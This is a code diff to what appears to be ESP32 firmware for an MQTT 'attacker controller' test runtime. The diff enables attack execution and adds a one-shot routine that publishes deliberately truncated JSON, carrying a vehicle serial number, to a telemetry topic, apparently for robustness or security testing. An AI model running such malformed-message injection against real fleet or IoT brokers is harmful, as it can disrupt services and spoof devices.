@@ -895,14 +895,14 @@ static void handle_complete_control(void)
 
         ESP_LOGI(
             TAG,
-            "attack controller armed mode=%s execution_enabled=false",
+            "attack controller armed mode=%s execution_enabled=true",
             occ_attack_mode_to_string(
                 mode
             )
         );
 
         publish_attack_controller_status(
-            "armed_no_execution"
+            "armed_ready"
         );
 
         cJSON_Delete(root);
@@ -1511,11 +1511,128 @@ static int build_payload(
 }
 
 
+static void execute_armed_attack_once(void)
+{
+    const occ_attack_mode_t mode =
+        occ_attack_controller_mode();
+
+    if (mode == OCC_ATTACK_MODE_IDLE) {
+        return;
+    }
+
+    if (
+        s_client == NULL ||
+        !s_mqtt_connected
+    ) {
+        return;
+    }
+
+    if (mode != OCC_ATTACK_MODE_MALFORMED) {
+        ESP_LOGW(
+            TAG,
+            "attack mode=%s not implemented",
+            occ_attack_mode_to_string(mode)
+        );
+
+        occ_attack_controller_stop();
+        return;
+    }
+
+    /*
+     * Deliberately invalid/truncated JSON.
+     */
+    char payload[160];
+
+    const int payload_len =
+        snprintf(
+            payload,
+            sizeof(payload),
+            "{"
+            "\"schema_ver\":\"runtime-1.0\","
+            "\"serialNumber\":\"%s\","
+            "\"seq\":",
+            s_vehicle_id
+        );
+
+    if (
+        payload_len <= 0 ||
+        payload_len >= (int)sizeof(payload)
+    ) {
+        ESP_LOGE(
+            TAG,
+            "MALFORMED payload construction failed"
+        );
+
+        occ_attack_controller_stop();
+        return;
+    }
+
+    ESP_LOGW(
+        TAG,
+        "ATTACK_START mode=MALFORMED vehicle=%s",
+        s_vehicle_id
+    );
+
+    publish_attack_controller_status(
+        "attack_start"
+    );
+
+    const int msg_id =
+        esp_mqtt_client_publish(
+            s_client,
+            s_telemetry_topic,
+            payload,
+            payload_len,
+            OCC_MQTT_QOS,
+            0
+        );
+
+    if (msg_id >= 0) {
+        ESP_LOGW(
+            TAG,
+            "ATTACK_ACTION mode=MALFORMED mqtt_id=%d",
+            msg_id
+        );
+
+        publish_attack_controller_status(
+            "attack_action_sent"
+        );
+    } else {
+        ESP_LOGE(
+            TAG,
+            "ATTACK_ACTION mode=MALFORMED publish_failed"
+        );
+
+        publish_attack_controller_status(
+            "attack_action_failed"
+        );
+    }
+
+    ESP_LOGW(
+        TAG,
+        "ATTACK_STOP mode=MALFORMED"
+    );
+
+    publish_attack_controller_status(
+        "attack_stop"
+    );
+
+    /*
+     * One-shot bounded attack.
+     */
+    occ_attack_controller_stop();
+
+    publish_attack_controller_status(
+        "idle_after_attack"
+    );
+}
+
+
 void app_main(void)
 {
     ESP_LOGI(
         TAG,
-        "OCC MQTT VM-003 attacker controller runtime starting - execution disabled"
+        "OCC MQTT VM-003 attacker runtime starting - native MALFORMED enabled"
     );
 
     occ_attack_controller_init();
@@ -2335,6 +2452,11 @@ void app_main(void)
                 }
             }
         }
+
+        /*
+         * Execute one explicitly armed bounded attack.
+         */
+        execute_armed_attack_once();
 
         if (
             s_mqtt_connected &&
